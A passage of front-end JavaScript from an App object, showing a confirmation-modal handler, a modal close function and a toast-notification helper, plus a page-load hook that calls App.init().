    document.getElementById('modal-confirm-btn').onclick = () => { this.closeModal(); fn(); };
    document.getElementById('confirm-modal').classList.add('active');
  },

  closeModal() {
    document.getElementById('confirm-modal').classList.remove('active');
  },

  // ======================== TOAST ========================
  showToast(msg, type) {
    const c = document.getElementById('toast-container');
    const t = document.createElement('div');
    t.className = 'toast toast-' + type;
    t.textContent = msg;
    c.appendChild(t);
    setTimeout(() => t.classList.add('tv'), 10);
    setTimeout(() => { t.classList.remove('tv'); setTimeout(() => t.remove(), 300); }, 3000);
  }
};

document.addEventListener('DOMContentLoaded', () => App.init());
